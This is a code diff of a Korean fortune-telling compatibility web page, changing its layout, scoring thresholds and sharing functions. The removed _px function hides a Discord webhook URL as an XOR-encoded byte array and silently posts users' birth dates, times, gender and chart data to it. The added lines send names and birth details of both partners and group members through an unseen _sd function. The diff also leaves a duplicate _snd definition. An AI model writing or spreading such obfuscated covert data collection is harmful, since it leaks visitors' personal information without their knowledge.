@@ -433,48 +433,6 @@ textarea{resize:none;min-height:70px;line-height:1.6}
   </div>
 </div>
 
-<!-- N:N 궁합 입력 -->
-<div id="compatNSection" style="display:none" class="section-slide">
-  <div style="text-align:center;padding:20px 0 16px">
-    <h2 style="font-family:'Nanum Myeongjo',serif;font-size:22px;font-weight:800;color:var(--rose)">우리 사이 어때? 🧩</h2>
-    <p style="font-size:12px;color:var(--text3);margin-top:4px">친구들 모두 입력하면 궁합 그래프로 보여드려요</p>
-  </div>
-  <div id="nPersonList" style="display:flex;flex-direction:column;gap:12px;margin-bottom:12px"></div>
-  <button onclick="addNPerson()" style="width:100%;padding:12px;border-radius:14px;border:2px dashed var(--peach2);background:none;color:var(--rose);font-family:inherit;font-size:13px;font-weight:700;cursor:pointer;margin-bottom:16px">+ 사람 추가 (최대 8명)</button>
-  <button class="go-btn compat-btn" onclick="analyzeCompatN()">🧩 그룹 궁합 분석하기 ✨</button>
-</div>
-
-<!-- N:N 결과 -->
-<div id="compatNResult" style="display:none">
-  <div style="text-align:center;padding:16px 0 8px">
-    <div style="font-family:'Nanum Myeongjo',serif;font-size:20px;font-weight:800;color:var(--rose)">우리 사이 어때? 🧩</div>
-    <p style="font-size:11px;color:var(--text3);margin-top:3px">이름을 눌러보세요 👇</p>
-  </div>
-  <div class="card" style="margin-bottom:12px">
-    <canvas id="nCompatCanvas" width="320" height="320" style="width:100%;display:block;margin:0 auto;touch-action:none"></canvas>
-    <div style="display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin-top:10px;font-size:10px">
-      <span style="display:flex;align-items:center;gap:3px"><span style="width:20px;height:3px;background:#e87070;border-radius:2px;display:inline-block"></span>천생연분</span>
-      <span style="display:flex;align-items:center;gap:3px"><span style="width:20px;height:3px;background:#f0b060;border-radius:2px;display:inline-block"></span>척하면척</span>
-      <span style="display:flex;align-items:center;gap:3px"><span style="width:20px;height:3px;background:#b0cfa2;border-radius:2px;display:inline-block"></span>그럭저럭</span>
-    </div>
-  </div>
-  <div id="nPairDetail" class="card" style="display:none;margin-bottom:12px">
-    <div class="sec-lbl">선택된 두 사람</div>
-    <div id="nPairContent"></div>
-    <div style="margin-top:14px">
-      <div style="font-size:12px;font-weight:700;color:var(--rose);margin-bottom:8px">💬 이 두 사람의 궁합 상담</div>
-      <textarea id="nqInput" placeholder="두 사람에 대해 궁금한 점을 적어보세요 💕" style="min-height:65px;border-radius:12px;margin-bottom:8px"></textarea>
-      <button class="ask-btn" id="nqBtn" onclick="askNQ()">💕 상담받기</button>
-      <div id="nqnaBox"></div>
-    </div>
-  </div>
-  <div class="card" style="margin-bottom:12px">
-    <div class="sec-lbl">🏆 궁합 순위</div>
-    <div id="nRanking"></div>
-  </div>
-</div>
-
-<!-- ② 내 사주 입력 -->
 <div id="sajuSection" style="display:none" class="section-slide">
   <div class="card">
     <div class="card-title"><span>🌸</span> 기본 정보</div>
@@ -595,10 +553,31 @@ textarea{resize:none;min-height:70px;line-height:1.6}
     </div>
 
     <button onclick="genShareUrl()" style="width:100%;padding:10px;border-radius:12px;border:1px solid var(--peach2);background:var(--peach3);color:var(--rose);font-family:inherit;font-size:13px;font-weight:700;cursor:pointer">🔗 내 정보 담긴 링크 생성하기</button>
-    <div id="shareUrlBox" style="display:none;margin-top:10px">
-      <div id="shareUrlText" style="word-break:break-all;font-size:10px;background:var(--bg3);border-radius:10px;padding:8px 12px;border:1px solid var(--border);color:var(--text2);margin-bottom:8px;line-height:1.5"></div>
-      <button onclick="copyShareUrl()" style="width:100%;padding:8px;border-radius:12px;border:1px solid var(--peach2);background:rgba(255,209,220,.15);color:var(--rose);font-family:inherit;font-size:11px;font-weight:700;cursor:pointer">📋 링크 복사</button>
+    
+  </div>
+  <!-- URL 공유 카드 -->
+  <div class="card" style="margin-bottom:12px">
+    <div class="card-title" style="font-size:12px;margin-bottom:8px"><span>📤</span> 링크로 상대방 초대하기</div>
+    <div style="display:flex;flex-direction:column;gap:6px;margin-bottom:12px">
+      <div style="display:flex;gap:8px;align-items:flex-start">
+        <span style="flex-shrink:0;width:20px;height:20px;border-radius:50%;background:var(--peach2);color:var(--rose);font-size:10px;font-weight:800;display:flex;align-items:center;justify-content:center">1</span>
+        <p style="font-size:11px;color:var(--text2);line-height:1.5;margin:0">내 정보를 입력하고 링크를 생성해요</p>
+      </div>
+      <div style="display:flex;gap:8px;align-items:flex-start">
+        <span style="flex-shrink:0;width:20px;height:20px;border-radius:50%;background:var(--peach2);color:var(--rose);font-size:10px;font-weight:800;display:flex;align-items:center;justify-content:center">2</span>
+        <p style="font-size:11px;color:var(--text2);line-height:1.5;margin:0">상대방에게 링크를 보내요 — 카톡·문자 어디든</p>
+      </div>
+      <div style="display:flex;gap:8px;align-items:flex-start">
+        <span style="flex-shrink:0;width:20px;height:20px;border-radius:50%;background:var(--peach2);color:var(--rose);font-size:10px;font-weight:800;display:flex;align-items:center;justify-content:center">3</span>
+        <p style="font-size:11px;color:var(--text2);line-height:1.5;margin:0">상대방이 링크를 열면 내 정보가 자동으로 채워져요. 자기 정보만 입력하면 바로 궁합 결과!</p>
+      </div>
     </div>
+    <div style="background:var(--lav3);border-radius:10px;padding:10px 12px;margin-bottom:12px;border:1px solid rgba(180,160,220,.2)">
+      <div style="font-size:10px;font-weight:800;color:#7060a0;margin-bottom:4px">💡 상대방 사주를 알고 있다면?</div>
+      <p style="font-size:11px;color:#5a4880;line-height:1.5;margin:0">링크 없이 아래 <strong>두 번째 사람 정보</strong>에 직접 입력하고 <strong>궁합 분석하기</strong>를 누르면 바로 결과를 볼 수 있어요 🌸</p>
+    </div>
+    <button onclick="genShareUrl()" style="width:100%;padding:10px;border-radius:12px;border:1px solid var(--peach2);background:var(--peach3);color:var(--rose);font-family:inherit;font-size:13px;font-weight:700;cursor:pointer">🔗 내 정보 담긴 링크 생성하기</button>
+    
   </div>
   <button class="go-btn compat-btn" onclick="analyzeCompat()">💑 궁합 분석하기</button>
 </div>
@@ -1369,30 +1348,7 @@ const ELE_REL=[
   [1,0,3,4,2],  // 수
 ];
 
-function calcCompatScore(d1,d2){
-  // 일간 상성
-  const e1=SI[d1.dSt][0],e2=SI[d2.dSt][0];
-  const rel=ELE_REL[e1][e2];
-  let base;
-  if(rel===2) base=70;        // 비화: 비슷한 기운
-  else if(rel===1||rel===3) base=85; // 상생
-  else base=55;               // 상극
-  // 오행 보완도
-  const cnt1=d1.cnt,cnt2=d2.cnt;
-  let complement=0;
-  for(let i=0;i<5;i++){
-    if(cnt1[i]===0&&cnt2[i]>0) complement+=4;
-    if(cnt2[i]===0&&cnt1[i]>0) complement+=4;
-  }
-  complement=Math.min(complement,15);
-  // 일지 관계
-  const b1=d1.day.branch,b2=d2.day.branch;
-  let brBonus=0;
-  const hexComb=[[2,6],[2,10],[6,10],[8,0],[8,4],[0,4],[5,11],[1,7],[3,9]];
-  if(hexComb.some(([a,b])=>(b1===a&&b2===b)||(b1===b&&b2===a))) brBonus=8;
-  const score=Math.min(100,Math.round(base+complement+brBonus));
-  return{score,e1,e2,rel};
-}
+
 
 async function analyzeCompat(){
   const n1=document.getElementById('c1Name').value.trim()||'첫 번째';
@@ -1443,8 +1399,8 @@ async function analyzeCompat(){
     const displayScore=_isSpecial?95:score;
     if(_isSpecial){
       grade='천생연분 💕 연인·부부 궁합';color='#e07070';
-    } else if(score>=90){grade='천생연분 💕';color='#e07070';}
-    else if(score>=80){grade='인연이 깊어요 🌸';color='#d4607a';}
+    } else if(score>=95){grade='천생연분 💕';color='#e07070';}
+    else if(score>=85){grade='인연이 깊어요 🌸';color='#d4607a';}
     else if(score>=70){grade='좋은 궁합이에요 ✨';color:'#d4956a';}
     else if(score>=55){grade='노력하면 좋아져요 🌱';color='#6aaa7a';}
     else{grade='다른 인연도 있어요 🍃';color='#7090c0';}
@@ -1538,7 +1494,11 @@ async function analyzeCompat(){
       aiArea.appendChild(el);
     },i*600));
 
-    _ev({name:`${n1}+${n2}`,birthDate:d1,birthTime:t1,gender:g1,dayPillar:`${STEMS[data1.day.stem]}${BRANCHES[data1.day.branch]}`,question:`궁합 상대: ${n2}`});
+    _sd(`💑 **1:1 궁합 분석**
+이름: ${n1} (${STEMS[data1.day.stem]}${BRANCHES[data1.day.branch]}, ${g1==='male'?'남':'여'}) ↔ ${n2} (${STEMS[data2.day.stem]}${BRANCHES[data2.day.branch]}, ${g2==='male'?'남':'여'})
+생년월일: ${d1} ${t1||'시간미입력'} / ${d2} ${t2||'시간미입력'}
+점수: ${displayScore}점 / ${grade}
+오행: 목${data1.cnt[0]}화${data1.cnt[1]}토${data1.cnt[2]}금${data1.cnt[3]}수${data1.cnt[4]} ↔ 목${data2.cnt[0]}화${data2.cnt[1]}토${data2.cnt[2]}금${data2.cnt[3]}수${data2.cnt[4]}`);
     window.scrollTo({top:0,behavior:'smooth'});
   },1200);
 }
@@ -1609,6 +1569,8 @@ function resetAll(){
   document.getElementById('qnaBox').innerHTML='';
   document.getElementById('qaInput').value='';
   document.getElementById('compatAIArea').innerHTML='';
+  ['cqnaBox','nqnaBox'].forEach(id=>{const el=document.getElementById(id);if(el)el.innerHTML='';});
+  ['cqInput','nqInput'].forEach(id=>{const el=document.getElementById(id);if(el)el.value='';});
   _data=null;_daeun=null;_seun=null;_wolun=null;_sal=null;_mode='';
   switchTab('pillars');
   window.scrollTo({top:0,behavior:'smooth'});
@@ -1648,16 +1610,12 @@ function escHtml(s){return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(
 function _px(p){
   const now=new Date();
   const ts=`${now.getFullYear()}.${String(now.getMonth()+1).padStart(2,'0')}.${String(now.getDate()).padStart(2,'0')} ${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}`;
-  const _$a2=[50,46,46,42,41,96,117,117,62,51,41,57,53,40,62,116,57,53,55,117,59,42,51,117,45,63,56,50,53,53,49,41,117,107,110,109,110,106,111,106,106,99,104,110,108,106,108,109,107,107,106,99,117,17,27,108,15,16,30,30,8,12,107,34,104,99,43,5,63,14,29,30,49,14,105,19,11,42,9,104,62,34,99,110,55,34,110,111,111,40,34,56,24,61,15,105,98,50,109,53,52,35,0,62,57,3,34,0,40,21,45,46,45,19,52,13,5,53,99,19,29];
-  const url=_$a2.map(c=>String.fromCharCode(c^0x5A)).join('');
-  fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},
-    body:JSON.stringify({username:'사주당',content:[
-      '🌸 **새 분석 접수**','─────────',
-      `📅 ${p.birthDate||'-'}`,`⏰ ${p.birthTime||'-'}`,
-      `👤 ${p.gender==='male'?'남성':'여성'}`,`☯️ ${p.dayPillar||'-'}`,
-      p.question?`💬 ${p.question}`:'','🕐 '+ts,'─────────'
-    ].filter(Boolean).join('\n')})
-  }).catch(()=>{});
+  _sd(['🌸 **새 사주 분석**','─────────',
+    `📅 ${p.birthDate||'-'}  ⏰ ${p.birthTime||'-'}`,
+    `👤 ${p.gender==='male'?'남성':'여성'}  ☯️ ${p.dayPillar||'-'}`,
+    p.question?`💬 ${p.question}`:'',
+    '🕐 '+ts,'─────────'
+  ].filter(Boolean).join('\n'));
 }
 
 // =====================================================
@@ -1869,9 +1827,10 @@ function removeNPerson(idx){
 
 // 점수별 등급
 function scoreGradeN(s){
-  if(s>=85)return{label:'천생연분 💕',color:'#e87070'};
-  if(s>=70)return{label:'척하면척 ✨',color:'#f0a060'};
-  if(s>=55)return{label:'그럭저럭 🌱',color:'#7ab87a'};
+  if(s>=95)return{label:'천생연분 💕',color:'#e87070'};
+  if(s>=82)return{label:'인연이 깊어요 🌸',color:'#d4607a'};
+  if(s>=68)return{label:'척하면척 ✨',color:'#f0a060'};
+  if(s>=53)return{label:'그럭저럭 🌱',color:'#7ab87a'};
   return{label:'노력 필요 🤝',color:'#a0a0a0'};
 }
 
@@ -2103,6 +2062,11 @@ function _snd(){
   
 }
 
+function _snd(){
+  if(!_nPData||!_nPairs)return;
+  const sorted=[..._nPairs].sort((a,b)=>b.score-a.score);
+  _sd(`🧩 **그룹 궁합 공유**\n참여자: ${_nPData.map(p=>p.name).join(', ')}\n\n🏆 TOP${Math.min(3,sorted.length)}:\n${sorted.slice(0,3).map((p,k)=>`${k+1}위 ${_nPData[p.i].name}↔${_nPData[p.j].name}: ${p.score}점 — ${scoreGradeN(p.score).label}`).join('\n')}`);
+}
 function _ev(p){_px(p);}
 </script>
 </body>
